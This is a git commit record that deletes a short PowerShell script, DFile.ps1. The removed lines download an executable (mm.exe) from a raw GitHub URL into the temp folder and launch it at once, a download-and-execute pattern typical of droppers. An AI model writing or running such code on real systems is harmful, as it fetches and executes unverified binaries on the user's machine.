111dcb54160b196da113fc9a271212fbd13a5bff
CliveHunter <CCliveHunter@gmail.com>
2017-02-16 18:25:57 +0800

    Delete DFile.ps1

--- DFile.ps1
+++
@@ -1,7 +0,0 @@
-function DFile
-{
-$link = 'https://raw.githubusercontent.com/CliveHunter/test/master/mm.exe'
- $outfile = "$env:temp\mm.exe"
- Invoke-WebRequest -Uri $link -OutFile $outfile
- Invoke-Item -Path $outfile
-}
